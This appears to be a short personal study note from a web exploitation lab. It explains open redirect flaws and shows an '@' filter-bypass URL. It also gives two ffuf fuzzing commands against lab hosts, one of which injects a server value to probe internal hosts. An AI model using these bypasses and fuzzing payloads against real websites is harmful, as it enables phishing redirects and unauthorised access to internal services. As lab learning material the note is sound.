#WebExploitation 
Open redirect happens when the webapp takes and untrusted input and redirects a user from the webapp to an untrusted site or to malicous resources
*Example*:
![[OpenRedirect.JPG]]
The filtering system in place may only be looking for the string 'google.com'. As long as the evil site url features this string, the filtering may be bypassed

The first one allows redirection to any site
http://or1.nahamsec.thm/?redirect=http://archlinux.org
The second one does not. However, using the @ method, with a trusted domain at the beginnig, redirection is allowed
http://or2.nahamsec.thm/?redirect=http://www.google.com@archlinux.org

Fuzz for parameters that might lead to that open redirect
```ffuf
ffuf -u 'http://nahamstore.thm/?FUZZ=http://google.com' -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -mc 301,302
```
Try to access authenticated only pages while not logged in

```ffuf
ffuf -u 'http://nahamstore.thm/stockcheck' -c -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -X POST -d 'product_id=2&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#'
```